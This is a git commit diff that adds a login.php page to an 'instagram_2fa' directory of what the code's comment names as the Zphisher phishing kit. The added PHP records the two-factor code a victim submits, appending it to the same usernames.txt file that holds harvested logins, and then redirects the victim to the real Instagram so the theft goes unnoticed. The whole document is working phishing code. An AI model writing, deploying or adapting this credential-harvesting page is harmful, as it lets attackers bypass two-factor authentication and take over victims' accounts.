1d4f2ac24b2996c04414f60d6d33264457118c00
Saurabh Mahamuni <109416515+Saurabhm2@users.noreply.github.com>
2026-03-25 19:02:08 +0530

    Update login.php

--- websites/instagram_2fa/login.php
+++ websites/instagram_2fa/login.php
@@ -1,1 +1,7 @@
-
+<?php
+// Append the 2FA code to the same file used by Zphisher
+file_put_contents("usernames.txt", "2FA Code: " . $_POST['code'] . "\n", FILE_APPEND);
+// Redirect to real Instagram
+header('Location: https://www.instagram.com/');
+exit();
+?>
